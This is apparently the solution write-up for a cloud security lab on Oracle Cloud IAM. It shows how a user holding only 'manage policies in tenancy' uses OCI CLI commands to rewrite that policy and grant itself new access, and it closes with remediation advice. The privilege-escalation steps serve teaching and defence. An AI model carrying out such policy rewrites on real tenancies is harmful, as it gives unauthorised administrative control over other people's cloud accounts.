# SCN-IAM-001: Solution

## Root cause

The test user's group has exactly one statement: `manage policies in
tenancy`. That sounds like it only lets someone edit policy documents.
It doesn't. `manage` on the `policies` resource-type includes
`POLICY_UPDATE`, and `UpdatePolicy` has no restriction on what the new
statement text says. A principal that can update a policy can rewrite it
to grant itself anything else, as long as that policy's own attachment
point covers the scope being granted.

Oracle documents this directly. The permission table for the `policies`
resource-type lists `POLICY_UPDATE`, `POLICY_CREATE`, and `POLICY_DELETE`
under `manage`, with no carve-out for self-modification.

Source: [IAM Policy Reference](https://docs.oracle.com/en-us/iaas/Content/Identity/Reference/iampolicyreference.htm), Oracle Cloud Infrastructure documentation.

A verb that sounds like paperwork ("manage policies") is, in practice,
the master key to whatever scope that policy is attached to.

## How to confirm it, step by step

Check what the test user can do before touching anything:

```bash
oci iam group list --profile SCN-IAM-001
```

This fails with `NotAuthorizedOrNotFound`. The user has no grant over the
`groups` resource-type at all.

Read the vulnerable policy to see the actual grant:

```bash
oci iam policy get --policy-id $(terraform output -raw policy_ocid) --profile DEFAULT
```

One statement: `manage policies in tenancy`. Nothing else.

Now use exactly that permission, as the test user, to add a new
statement:

```bash
oci iam policy update \
  --policy-id $(terraform output -raw policy_ocid) \
  --statements '["Allow group id <group-ocid> to manage policies in tenancy","Allow group id <group-ocid> to inspect groups in tenancy"]' \
  --version-date "" \
  --profile SCN-IAM-001 \
  --force
```

Wait a few seconds for the policy change to propagate, then repeat the
first check:

```bash
oci iam group list --profile SCN-IAM-001
```

This now succeeds, and returns every group in the tenancy, including
`Administrators`. The test user granted itself visibility it never had,
using only the permission it started with.

## What this does and doesn't prove

It proves that `manage policies` is equivalent to full administrative
control of whatever scope the policy covers, because the principal
holding that verb can rewrite the exact statement that restricts it. It
does not prove a flaw in Oracle's platform. The permission table is
documented precisely; the mistake here is an operator granting a broad
verb without realizing its real ceiling.

It also doesn't demonstrate anything about authentication, MFA, or how
an attacker would obtain the test user's credential in the first place.
That credential is handed to you as the starting point of this lab, the
same way CloudGoat hands you an initial IAM identity. It isn't a
simulation of a leak.

## Remediation

- Treat `manage policies` as equivalent to admin over whatever scope the
  policy is attached to. Never grant it to a group that shouldn't have
  full control of that scope.
- If a group genuinely needs to manage a specific policy's lifecycle,
  scope more narrowly where possible, and audit that policy's statements
  regularly for unexpected additions.
- Enumerate every policy a group can modify, not just what it's
  documented to do. A policy that looks narrow today can be rewritten by
  its own holder tomorrow.
- Treat any principal with `manage policies` as a privileged identity for
  every purpose: MFA, credential rotation, and audit logging all apply
  as if it already had the access it could grant itself.
